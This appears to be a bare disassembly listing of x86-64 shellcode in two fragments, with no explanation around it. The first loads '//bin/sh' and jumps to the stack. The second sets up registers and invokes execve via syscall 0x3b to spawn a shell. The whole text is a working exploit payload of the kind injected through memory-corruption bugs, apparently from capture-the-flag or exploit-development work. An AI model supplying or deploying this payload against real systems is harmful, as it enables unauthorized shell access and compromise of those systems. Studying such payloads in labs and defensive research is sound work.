
   0:   48 bb 2f 2f 62 69 6e    mov rbx,0x68732f6e69622f2f
   7:   2f 73 68
   a:   5a                      pop    rdx
   b:   ff e4                   jmp    rsp

   0:   48 31 f6                xor    rsi,rsi
   3:   48 31 d2                xor    rdx,rdx
   6:   b0 3b                   mov    al,0x3b
   8:   52                      push   rdx
   9:   53                      push   rbx
   a:   48 89 e7                mov    rdi,rsp
   d:   0f 05                   syscall
